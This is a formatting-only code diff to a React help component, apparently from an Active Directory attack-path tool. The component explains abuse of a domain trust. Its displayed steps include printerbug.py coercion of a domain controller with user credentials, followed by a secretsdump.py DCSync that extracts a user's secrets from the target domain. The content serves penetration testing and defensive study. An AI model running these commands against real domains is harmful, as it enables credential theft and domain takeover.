@@ -73,7 +73,9 @@ const LinuxAbuse: FC = () => {
             </Typography>
 
             <Typography variant='body1'>Step 2: Coerce target DC</Typography>
-            <Typography variant='body2'>Coerce the target DC using printerbug.py with the credentials of any source domain user:</Typography>
+            <Typography variant='body2'>
+                Coerce the target DC using printerbug.py with the credentials of any source domain user:
+            </Typography>
             <Typography component={'pre'}>
                 {"printerbug.py '<domain>/<username>:<password>'@<target DC IP> <compromised DC IP>"}
             </Typography>
@@ -98,7 +100,7 @@ const LinuxAbuse: FC = () => {
             <Typography variant='body1'>Step 4: DCSync target domain</Typography>
             <Typography variant='body2'>Use secretsdump.py to DCSync the target domain:</Typography>
             <Typography component={'pre'}>
-                {"secretsdump.py -k -just-dc-user <DOMAIN/targetuser> <target DC DNS name>"}
+                {'secretsdump.py -k -just-dc-user <DOMAIN/targetuser> <target DC DNS name>'}
             </Typography>
         </>
     );
